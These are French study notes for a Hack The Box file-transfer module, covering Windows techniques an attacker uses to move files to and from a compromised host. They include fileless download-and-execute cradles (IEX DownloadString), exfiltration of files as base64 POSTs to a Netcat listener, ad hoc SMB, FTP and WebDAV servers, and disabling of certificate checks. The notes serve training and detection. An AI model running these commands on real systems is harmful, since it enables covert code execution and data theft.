---
title: File Transfers
description: 
published: true
date: 2025-03-29T13:32:20.534Z
tags: notes, htb, module
editor: markdown
dateCreated: 2025-03-16T15:21:30.098Z
---

# File Transfers

Date de complétion: XX/XX/XX

# Notes

## Windows File Transfer Methods

### Introduction

Les nouvelles versions de Windows comportent de nombreux outils pour le transfert de fichiers.
Les attaquants utilisent le transfert de fichier pour opérer et éviter de se faire détecter.
Les défenseurs doivent connaitre ces méthodes et leur fonctionnement pour surveiller et créer les politiques correspondantes.

Le post [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) donne un exemple d'APT et des [menaces sans fichier](https://learn.microsoft.com/fr-fr/defender-endpoint/malware/fileless-threats).

Les menaces fileless, n'existent pas sous forme de fichiers mais exploitent des outils légitimes du système pour exécuter des attaques.

L'attaque Astaroth commence par un lien malveillant dans un e-mail de phishing, menant à un fichier LNK.
Celui-ci déclenche l'exécution de [WMIC](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic) avec l'option "/Format" pour télécharger du code JavaScript malveillant.
Ce dernier utilise [Bitsadmin](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool) pour récupérer des charges utiles encodées en base64, qui sont ensuite décodées avec Certutil.
Enfin, [Regsvr32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) charge un DLL permettant d'injecter le malware Astaroth dans le processus Userinit.

Voici les étapes de l'attaque Astaroth:
![fig1a-astaroth-attack-chain.png](/images/fig1a-astaroth-attack-chain.png){.align-center}

Pour plus d'informations sur les fileless threats:
[now-you-see-me-exposing-fileless-malware](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/)

### PowerShell Base64 Encode & Decode

Selon la taille du fichier à transférer, différentes méthodes sans communication réseau peuvent être utilisées.

Avec un terminal, on peut encoder un fichier en base64, copier son contenu, puis le décoder pour retrouver le fichier d'origine.

Il est essentiel de vérifier l'intégrité du fichier avant et après le transfert. Pour cela, on peut utiliser md5sum, qui génère et vérifie des sommes de contrôle MD5 de 128 bits.

Récupérer le hash du fichier

```
md5sum myfile
```

Encoder le fichier en base64

```
cat myfile | base64 -w 0; echo
```

Une fois sur la cible, il est possible d'écrire le contenu décodé dans un fichier

```
[IO.File]::WriteAllBytes("C:\temp\fichier", [Convert]::FromBase64String("<contenu>"))
```

Il est maintenant possible de vérifier que le hash MD5 correspond bien à l'original avec [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2).

```
Get-FileHash C:\temp\fichier -Algorithm md5
```

Cependant un webshell ou l'utilitaire de ligne de commande Windows (cmd.exe) ont des limites en terme de taille de chaîne de caractères.

### PowerShell Web Downloads

Il est possible d'utiliser la classe PowerShell [system.net.webclient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient) pour télécharger des fichiers avec HTTP/S ou encore FTP.

### File Download

Télécharger un fichier avec les méthodes DownloadFile et DownloadFileAsync:

```
(New-Object Net.WebClient).DownloadFile('<URL>','<fichier de sortie>')
```

```
(New-Object Net.WebClient).DownloadFileAsync('<URL>','<fichier de sortie>')
```

### PowerShell DownloadString - Fileless Method

Au lieu de télécharger un script PowerShell sur le disque, on peut l'exécuter directement en mémoire en utilisant la commande Invoke-Expression.
Éxécuter un fichier (mode fileless) avec [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) et la méthode DownloadString:

```
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

```
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

### PowerShell Invoke-WebRequest

À partir de PowerShell 3.0, la commande Invoke-WebRequest (alias de curl,iwr,wget) permet de télécharger des fichiers, mais elle est relativement lente.

```
Invoke-WebRequest <URL> -OutFile <fichier>
```

Une petite liste de "cradles" (technique utilisée pour télécharger et exécuter du code malveillant directement en mémoire) est disponible [ici](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### Common Errors with PowerShell

Parfois Internet Explorer doit être lancé au moins une première fois avant d'exécuter Invoke-WebRequest.
Pour résoudre ce problème il est possible d'utiliser l'option "-UseBasicParsing"

Avec Net.WebClient, pour ne pas vérifier le certificat SSL:

```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

Le protocole SMB (Server Message Block) tourne sur le port TCP 445. C'est un protocole commun sur les réseaux composés de services Windows. Il permet entre autres aux applications et utilisateurs de transférer des fichiers vers et depuis des serveurs SMB.

Il est possible d'utiliser [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) de la suite Impacket pour créer un partage SMB.

```
impacket-smbserver share -smb2support /tmp/smbshare
```

Il est possible d'utiliser des commandes comme [Copy-item](https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.management/copy-item?view=powershell-7.5), ou [Move-Item](https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.management/move-item?view=powershell-7.5) ou encore [copy](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/copy) pour interagir avec le partage.

```
copy \\<adresse>\<partage>\<fichier>
```

Parfois la politique Windows peut empêcher l'accès aux partages ne nécessitant aucune authentification.
Pour contourner cela il est possible de créer un serveur SMB avec authentification:

```
impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Pour monter le partage sur un lecteur (parfois obligatoire pour certaines commandes):

```
net use <lettre>: \\<adresse>\<partage> /user:<utilisateur> <nom>
```

### FTP Downloads

Un autre moyen de transférer des fichiers est FTP (File Transfer Protocol), FTP utilise le port TCP 21 et TCP 20.
Il est possible d'utiliser un client FTP ou la classe PowerShell [Net.WebClient](https://learn.microsoft.com/fr-fr/dotnet/api/system.net.webclient?view=net-8.0).

Pour créer un serveur FTP, il est possible d'utiliser le module Python [pyftpdlib](https://pypi.org/project/pyftpdlib/)

Installer pyftpdlib:

```
pip3 install pyftpdlib
```

Démarrer le serveur FTP sur le port 21 (par défaut, le port 2121 est utilisé):

```
python3 -m pyftpdlib --port 21
```

Si aucun identifiant et mot de passe n'est précisé, l'authentification anonyme est activée.

Transférer des fichiers depuis le serveur FTP avec la classe PowerShell Net.WebClient:

```
(New-Object Net.WebClient).DownloadFile('ftp://<adresse>/<fichier>', '<fichier de sortie>')
```

Il est aussi possible de créer un fichier de commande FTP, cela est utile si le shell actuel n'est pas interactif.

```
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload Operations

Pour transférer des fichiers depuis la cible vers la machine attaquante, il est possible d'utiliser les mêmes méthodes que vue précédemment.

### PowerShell Base64 Encode & Decode

Nous avons vu précédemment comment encoder un fichier en base64.

Pour encoder un fichier en base64 avec PowerShell:

```
[Convert]::ToBase64String((Get-Content -path "<fichier>" -Encoding byte))
```

Pour récupérer le hash MD5 d'un fichier avec PowerShell:

```
Get-FileHash "<fichier>" -Algorithm MD5 | select Hash
```

Pour décoder un fichier en base64 sur Linux:

```
echo <châine encodée> | base64 -d > <fichier de sortie>
```

Pour récupérer le hash MS d'un fichier sur Linux:

```
md5sum <fichier>
```

### PowerShell Web Uploads

PowerShell ne dispose pas des fonctionnalités d'envoi intégrés.
Cependant il est possible d'utiliser [Invoke-WebRequest](/Commandes/Windows/PowerShell/Invoke-WebRequest) ou [Invoke-RestMethod](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod?view=powershell-7.5) pour créer cette fonctionnalitée.

De plus, il faut un serveur Web qui supporte les upload.
[uploadserver](https://github.com/Densaugeo/uploadserver) (une extension du modue http.server) permet cela.

Télécharger le module python:

```
pip3 install uploadserver
```

Démarrer le serveur web:

```
python3 -m uploadserver
```

Il est ensuite possible d'utiliser les cmdlets PowerShell ou de passer par un script comme [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1):

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<adresse>:<portr>/upload -File <fichier>
```

Un autre moyen d'envoyer des fichiers est de passer par une requête POST avec le fichier encodé, dans le body de la requête, et d'avoir un listener qui attends la requête.

Écouter sur le port avec Netcat:

```
nc -lvnp <port>
```

Effectuer la requête POST avec le fichier encodé dans le body:

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<fichier>' -Encoding Byte))
Invoke-WebRequest -Uri http://<adresse>:<port>/ -Method POST -Body $b64
```

### SMB Uploads

Par précaution, le port 445 (SMB) est souvent restreint au réseau interne de l'organisation.
Pour plus d'informations vous pouvez consulter le post Microsoft "[Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)".

Pour contourner cette restriction, il est possible d'utiliser SMB over HTTP avec [WebDAV](https://datatracker.ietf.org/doc/html/rfc4918).
WebDAV est une extension du protocole HTTP qui permet aux serveurs web de se comporter comme des serveurs de fichiers (supportant la création de contenu collaboratif). WebDAV peut aussi utiliser HTTPS.

Par défaut lors de l'utilisation d'un client SMB, lors d'une tentative de connexion à un partage SMB et si aucun partage SMB n'est disponible alors le client va essayer de se connecter en utilisant HTTP.

Pour mettre en place un serveur WebDAV, il faut utiliser les modules python [wsgidav](https://github.com/mar10/wsgidav) et [cheroot](https://pypi.org/project/cheroot/)

Télécharger les modules python nécessaires:

```
pip3 install wsgidav cheroot
```

Démarrer le serveur WebDAV sur le port 80 et en écoute sur toutes les adresses et avec une authentification Anonyme:

```
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

Se connecter au partage WebDAV:

```
dir \\192.168.49.128\DavWWWRoot
```

Le mot-clé `DavWWWRoot` est un mot spécial reconnu par Windows.
Effectivement aucun dossier avec ce nom n'est présent sur le serveur WebDAV. Ce mot clé indique au driver qui gère les requêtes WebDAV que la requête concerne la racine du serveur WebDAV.

Si un dossier spécifique existe, alors il est possible de l'entrer à la place de ce mot-clé pour s'y rendre.

Pour copier un fichier vers la racine du serveur WebDAV:

```
copy <fichier> \\192.168.49.129\DavWWWRoot\
```

Pour copier un fichier vers le dossier Shared du serveur WebDAV:

```
copy <fichier> \\192.168.49.129\Shared\
```

### FTP Uploads

L'envoi de fichier vers un serveur FTP est similaire au téléchargement.
Au niveau du démarrage du serveur FTP, il faut aussi préciser que les clients sont autorisés à envoyer des fichiers vers celui-ci:

```
python3 -m pyftpdlib --port 21 --write
```

Pour envoyer un fichier vers le serveur FTP:

```
(New-Object Net.WebClient).UploadFile('ftp://<adresse>/<fichier>', '<fichier>')
```

Il est aussi possible de créer un fichier de commande FTP comme vu précédemment:

```
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Linux File Transfer Methods
